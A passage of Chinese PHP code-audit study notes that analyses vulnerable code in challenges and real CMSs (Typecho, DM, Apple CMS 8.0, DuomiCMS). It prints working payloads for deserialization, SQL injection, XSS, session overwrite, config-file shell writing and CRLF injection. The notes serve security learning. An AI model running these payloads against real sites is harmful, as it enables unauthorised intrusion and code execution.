<?php

class Typecho_Request{

	private $_params = array();
	private $_fifter = array();

	public function __construct(){
		$this->_params['screenName'] = 'phpinfo()';
		$this->_fifter[0] = 'assert';
	}
}

class Typecho_Feed{

	private $_type;
	private $_item = array();
	public function s__construct(){

		$this->_type = 'RSS 2.0';
		$item['author'] = new Typecho_Request();
		$item['category']=Array(new Typecho_Request());
		$this->_item[0]=$item;
	}
}

$x = new Typecho_Feed();
$a = array(
	'adapter' => $x,
	'prefix' => 'Typecho_'

);

echo base64_encode(serialize($a));

?>
```

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200512150509.png)

- 测试

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200512153050.png)

## 误用htmlentities函数引发的漏洞

### String Lights

- code 

```php
$sanitized = [];

foreach ($_GET as $key => $value) {
  $sanitized[$key] = intval($value);
}

$queryParts = array_map(function ($key, $value) {
  return $key . '=' . $value;
}, array_keys($sanitized), array_values($sanitized));

$query = implode('&', $queryParts);

echo "<a href='/images/size.php?" .
  htmlentities($query) . "'>link</a>";
```

- htmlentities 

```
将字符转换为 HTML 转义字符
```
*ENT_COMPAT（默认值）：只转换双引号。
ENT_QUOTES：两种引号都转换。
ENT_NOQUOTES：两种引号都不转换。*

- 环境搭建

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200512165224.png)

- payload

```
a%27onclick%3Dalert%281%29%2f%2f=1
```

### DM企业建站系统 v201710
#### 漏洞分析

- admindm-yourname/mod_common/login.php:63

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200512171350.png)

- 直接拼接数据

```php
 $ss_P="select * from ".TABLE_USER."  where  email='$user' and ps='$pscrypt'  order by id desc limit 1";
```

- component/dm-config/global.common.php:421

**ENT_NOQUOTES两种引号都不转换，造成注入**
![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200512171544.png)

## 特定场合下addslashes函数的绕过

### Turkey Baster

- code 

```php
class LoginManager {
  private $em;
  private $user;
  private $password;

  public function __construct($user, $password) {
    $this->em = DoctrineManager::getEntityManager();
    $this->user = $user;
    $this->password = $password;
  }

  public function isValid() {
    $user = $this->sanitizeInput($this->user);
    $pass = $this->sanitizeInput($this->password);

    $queryBuilder = $this->em->createQueryBuilder()
      ->select("COUNT(p)")
      ->from("User", "u")
      ->where("user = '$user' AND password = '$pass'");
    $query = $queryBuilder->getQuery();
    return boolval($query->getSingleScalarResult());
  }

  public function sanitizeInput($input, $length = 20) {
    $input = addslashes($input);
    if (strlen($input) > $length) {
      $input = substr($input, 0, $length);
    }
    return $input;
  }
}

$auth = new LoginManager($_POST['user'], $_POST['passwd']);
if (!$auth->isValid()) {
  exit;
```

- 题解

**实例化一个LoginManager类名，接收用户传递的user，passwd两个参数，并通过isValid方法判断是否合法，sanitizeInput方法，通过addslashes方法进行过滤，再截取20位返回。**

- addslashes

```
作用：在单引号（'）、双引号（"）、反斜线（\）与 NUL（ NULL 字符）字符之前加上反斜线
```

- substr 

```
string substr ( string $string , int $start [, int $length ] )
```

**返回字符串 string 由 start 和 length 参数指定的子字符串。**

- user

```
1234567890123456789'
```

- sql 

```
select count(p) from user where user = '1234567890123456789\' AND password = 'or 1=1#'
```

- payload 

```
user=1234567890123456789'&passwd=or 1=1#
```

## 苹果CMS视频分享程序 8.0 

- 环境搭建

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200512232311.png)

#### 漏洞分析

- inc/common/template.php:754

**$lp['wd']直接拼接SQL语句，造成SQL注入**

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200513085115.png)

- inc/module/vod.php:96

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200513091938.png)

- inc/common/function.php:266

**对传进来的参数进行过滤**

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200513092121.png)

在*$res=isset($_REQUEST[$key]) ? $magicq ? $_REQUEST[$key] : @addslashes($_REQUEST[$key]) : '';*中可以知道wd参数是通过REQUEST方法获取的然后进行过滤。

- inc/common/360_safe3.php:27

**跟踪chkSql函数**

*将传进来的参数进行urldecode解码之后，通过StopAttack方法，最后通过htmlEncode方法，最后返回。*

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200513093123.png)

- inc/common/360_safe3.php:12

*跟进StopAttack方法，使用preg_match方法进行过滤*

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200513094302.png)

- inc/common/360_safe3.php:57
*跟踪$getfilter方法*

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200513095310.png)

- inc/common/function.php:572

*跟踪一下htmlEncode方法，针对 & 、 ' 、 空格 、 " 、 TAB 、 回车 、 换行 、 大于小于号 等符号进行实体编码转换*

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200513095430.png)

- inc/common/template.php:560

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200513101624.png)

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200513091938.png)

*而 wd 是可以从 REQUEST 中获取到，所以wd 实际上是可控的。*

- 漏洞思路

*SQL注入点是字符型注入，htmlEncode方法实体编码了单引号，最后进行了url解码操作，可以通过双编码绕过，htmlEncode方法没有过滤反斜杠，而addslashes方法会过滤反斜杠。*

- 构造SQL

```
wd=))||if((select%0b(select(m_name)``from(mac_manager))regexp(0x5e61)),(`sleep`(3)),0)#%25%35%63
```

## 从变量覆盖到getshell
### Snowman

- code

```php
class Carrot {
  const EXTERNAL_DIRECTORY = '/tmp/';
  private $id;
  private $lost = 0;
  private $bought = 0;

  public function __construct($input) {
    $this->id = rand(1, 1000);

    foreach ($input as $field => $count) {
      $this->$field = $count++;
    }
  }

  public function __destruct() {
    file_put_contents(
      self::EXTERNAL_DIRECTORY . $this->id,
      var_export(get_object_vars($this), true)
    );
  }
}

$carrot = new Carrot($_GET);
```

- payload 

```
id=shell.pho&shell=',)%0a// 
```

- 测试

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200513120025.png)


### DuomiCMS_3.0

- 环境搭建

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200513133757.png)

#### 漏洞分析

- duomiphp/common.php:52

*查看全局变量注册代码*

```php
foreach(Array('_GET','_POST','_COOKIE') as $_request)
{
	foreach($$_request as $_k => $_v) ${$_k} = _RunMagicQuotes($_v);
}
```
- duomiphp/common.php:36

*查看_RunMagicQuotes方法, _RunMagicQuotes 函数将特殊符号，使用 addslashes 函数进行转义处理*

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200513134725.png)

- admin/admin_ping.php:13

*全剧追踪fwrite函数，$weburl与token来源于post，可控。*

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200513135318.png)

*weburl 变量和 token 变量从 POST方式获取，经过了_RunMagicQuotes方法还有webscan.php的过滤，但是可以写shell*

**admin\admin_ping.php文件得需要admin身份才可以有访问权限写shell**

- admin/config.php:28

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200513140949.png)

- duomiphp/check.admin.php:41

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200513141135.png)

- admin/login.php:62

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200513142847.png)

- duomiphp/check.admin.php:72

*跟进checkUser方法*

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200513143011.png)

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200513143114.png)

- 登陆管理用户查看组

*可知用户组和userid均为1*
![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200513151034.png)

- 覆盖 session 的值

**重点注意这里git项目上的覆盖session有问题，可以使用这个payload**

```
member/share.php?_SESSION[duomi_group_id]=1&_SESSION[duomi_admin_id]=1
```

- payload



```POST /admin/admin_ping.php?action=set HTTP/1.1
Host: www.test.com:8888
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 34

weburl=";phpinfo();//&token=
```


- 测试

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200513220531.png)

## $_SERVER['PHP_SELF']导致的防御失效问题

### Sleigh Ride

- code 

```php
class Redirect {
  private $websiteHost = 'www.example.com';

  private function setHeaders($url) {
    $url = urldecode($url);
    header("Location: $url");
  }

  public function startRedirect($params) {
    $parts = explode('/', $_SERVER['PHP_SELF']);
    $baseFile = end($parts);
    $url = sprintf(
      "%s?%s",
      $baseFile,
      http_build_query($params)
    );
    $this->setHeaders($url);
  }
}

if ($_GET['redirect']) {
  (new Redirect())->startRedirect($_GET['params']);
}
```

- 环境搭建

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200514095859.png)

- 题解

*代码实现的功能实则为一个URL跳转的功能，PHP_SELF 指当前的页面绝对地址。*

- payload

```
/index.php/http:%252f%252fwww.syst1m.com?redirect=1
```

- 测试

*跳转到了我的博客*
![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200514101338.png)

## 深入理解$_REQUESTS数组

### Poem

- code

```php
class FTP {
  public $sock;

  public function __construct($host, $port, $user, $pass) {
    $this->sock = fsockopen($host, $port);

    $this->login($user, $pass);
    $this->cleanInput();
    $this->mode($_REQUEST['mode']);
    $this->send($_FILES['file']);
  }

  private function cleanInput() {
    $_GET = array_map('intval', $_GET);
    $_POST = array_map('intval', $_POST);
    $_COOKIE = array_map('intval', $_COOKIE);
  }

  public function login($username, $password) {
    fwrite($this->sock, "USER " . $username . "\n");
    fwrite($this->sock, "PASS " . $password . "\n");
  }

  public function mode($mode) {
    if ($mode == 1 || $mode == 2 || $mode == 3) {
      fputs($this->sock, "MODE $mode\n");
    }
  }

  public function send($data) {
    fputs($this->sock, $data);
  }
}

new FTP('localhost', 21, 'user', 'password');
```

- 题解

*mode是通过request传进来的，在cleanInput方法中将get、post、cookie传进来的全部通过intval函数过滤*

- REQUEST

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200514104553.png)

- payload

```
?mode=1%0a%0dDELETE%20test.file 
```

## Raw MD5 Hash引发的注入

### Turkey Baster

- code 

```php
class RealSecureLoginManager {
  private $em;
  private $user;
  private $password;

  public function __construct($user, $password) {
    $this->em = DoctrineManager::getEntityManager();
    $this->user = $user;
    $this->password = $password;
  }

  public function isValid() {
    $pass = md5($this->password, true);
    $user = $this->sanitizeInput($this->user);

    $queryBuilder = $this->em->createQueryBuilder()
      ->select("COUNT(p)")
      ->from("User", "u")
      ->where("password = '$pass' AND user = '$user'");
    $query = $queryBuilder->getQuery();
    return boolval($query->getSingleScalarResult());
  }

  public function sanitizeInput($input) {
    return addslashes($input);
  }
  
  $c = new RealSecureLoginManager(
  $_POST['user'],
  $_POST['passwd']
);
if (!$auth->isValid()) {
  exit;
}
```
- md5(计算字符串的 MD5 散列值)

```php
string md5 ( string $str [, bool $raw_output = false ] )
```

- 题解

*auth新建了一个RealSecureLoginManager对象，传进去POST的user和passwd。在md5方法中，如果可选的 raw_output 被设置为 TRUE，那么 MD5 报文摘要将以16字节长度的原始二进制格式返回。*

- fuzz

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200514111159.png)

- payload

```SQL
user= OR 1=1#&passwd=128
```

- SQL 

```SQL
select count(p) from user s where password='v�a�n���l���q��\' and user=' OR 1=1#'
```

### 实例分析

- 题目地址

```
http://ctf5.shiyanbar.com/web/houtai/ffifdyop.php
```

### 分析

- 查看源代码

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200514111818.png)

- password

```php
md5($password,true)
```

- payload

```php
password=ffifdyop或者129581926211651571912466741651878684928
```

- 测试

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200514112614.png)


## Tips整理

- in_array

```
第三个参数未设置为true,可利用弱类型比较绕过
```

- filter_var（url过滤）

```
未对协议进行校验，可利用xxx://绕过
```

- class_exists

```
当存在__autoload函数，会自动调用，如果类名可控，可造成危害，如果参数也可控，可利用内部函数进行攻击。
```

- strpos

```
strpos在没找到指定字符时会返回flase，如果第一个字符找到就返回0
```

- filter_var (FILTER_VALIDATE_EMAIL)

```
filter_var() 问题在于，我们在双引号中嵌套转义空格仍然能够通过检测。同时由于底层正则表达式的原因，我们通过重叠单引号和双引号，欺骗 filter_val() 使其认为我们仍然在双引号中，这样我们就可以绕过检测。
”aaa’aaa”@example.com
```

- escapeshellarg与escapeshellcmd

```
escapeshellarg与escapeshellcmd配合使用会存在绕过
```

- parse_str

```
parse_str的作用就是解析字符串并且注册成变量，它在注册变量之前不会验证当前变量是否存在，所以会直接覆盖掉当前作用域中原有的变量
```

- preg_replace

```
$pattern 存在 /e 模式修正符，允许代码执行
/e 模式修正符，是 preg_replace() 将 $replacement 当做php代码来执行
```


- extract 

```
从数组中将变量导入到当前的符号表
```

- readfile

```
可利用 ../http/../../ 跳过目录（如检测关键字https是否存在）
```

- 截断

```
%00 遇到遇到函数过滤会成为\0
```

- 反序列化

[PHP 反序列化漏洞学习](https://syst1m.com/post/php-deserialization/)


- htmlentities 

```
将字符转换为 HTML 转义字符
```
*ENT_COMPAT（默认值）：只转换双引号。
ENT_QUOTES：两种引号都转换。
ENT_NOQUOTES：两种引号都不转换。*


- $_SERVER['REQUEST_URI'] 

```
获取的参数是不会将参数中的特殊符号进行转换
```

- HPP

```
id=1&id=2 只会接收第二个参数
```

- md5(计算字符串的 MD5 散列值)

```
string md5 ( string $str [, bool $raw_output = false ] )
```

*在md5方法中，如果可选的 raw_output 被设置为 TRUE，那么 MD5 报文摘要将以16字节长度的原始二进制格式返回。*

- eregi截断漏洞

*ereg可用%00截断,要求php<5.3.4*

```
ereg编码%00时发生截断,不会检查%00后面的字符(%00算作1个字符)
```

- ssrf 

[ us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf)

